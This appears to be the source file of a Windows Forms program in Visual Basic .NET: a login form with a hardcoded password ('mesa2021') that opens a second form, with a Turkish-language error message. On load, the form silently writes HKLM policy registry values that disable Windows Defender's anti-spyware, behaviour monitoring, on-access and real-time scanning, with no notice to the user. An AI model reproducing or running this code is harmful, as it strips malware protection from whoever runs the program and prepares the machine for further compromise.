Imports System.Management
Imports Microsoft.Win32
Imports Microsoft.Win32.Registry
Imports System.IO

Public Class Form1

    Private Sub FormSkin1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FormSkin1.Click

    End Sub

    Private Sub FlatButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton1.Click
        If FlatTextBox1.Text = "mesa2021" Then
            Me.Hide()
            Form2.Show()
        End If
    End Sub

    Private Sub FlatTextBox1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles FlatTextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            Call FlatButton1_Click(sender, e)

        End If
    End Sub

    Private Sub FlatTextBox1_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles FlatTextBox1.KeyUp
        If e.KeyCode = Keys.Enter Then
            Call FlatButton1_Click(sender, e)

        End If
    End Sub

    Private Sub FlatTextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatTextBox1.TextChanged

    End Sub

    Private Sub Form1_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyUp
        If e.KeyCode = Keys.Enter Then
            Call FlatButton1_Click(sender, e)

        End If
    End Sub

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Try
            Dim kayit As RegistryKey
            Dim anahtar As String = "SOFTWARE\\Policies\\Microsoft\\Windows Defender"
            kayit = Registry.LocalMachine.OpenSubKey(anahtar, True)
            kayit = Registry.LocalMachine.CreateSubKey(anahtar)
            kayit = Registry.LocalMachine.OpenSubKey(anahtar, True)
            kayit.SetValue("DisableAntiSpyware", "00000001", RegistryValueKind.DWord)
            kayit.SetValue("DisableBehaviorMonitoring", "00000001", RegistryValueKind.DWord)
            kayit.SetValue("DisableOnAccessProtection", "00000001", RegistryValueKind.DWord)
            kayit.SetValue("DisableScanOnRealtimeEnable", "00000001", RegistryValueKind.DWord)





        Catch ex As Exception
            MsgBox("Registry işlemi tamamlanamadı", vbCritical)
        End Try


      






    End Sub
End Class
